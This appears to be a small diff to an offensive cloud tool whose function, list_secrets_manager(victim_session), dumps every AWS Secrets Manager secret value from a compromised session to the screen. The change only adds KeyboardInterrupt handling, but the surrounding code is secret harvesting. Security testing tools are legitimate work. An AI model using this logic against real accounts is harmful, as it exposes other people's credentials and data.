@@ -18,8 +18,12 @@ def list_secrets_manager(victim_session):
                 try:
                     secret_dump = secrets_client.get_secret_value(SecretId=name)
                     print(f"{Fore.YELLOW}{json.dumps(secret_dump, indent=4, sort_keys=True, default=custom_serializer)}")
+                except KeyboardInterrupt:
+                    raise
                 except:
                     print(f"{Fore.LIGHTBLACK_EX}Failed to retrieve secret: {name}")
+        except KeyboardInterrupt:
+            raise
         except:
             sys.stdout.write("\r\033[K")
             sys.stdout.write(f"{Fore.LIGHTBLACK_EX}Failed to list secrets in region {region}")
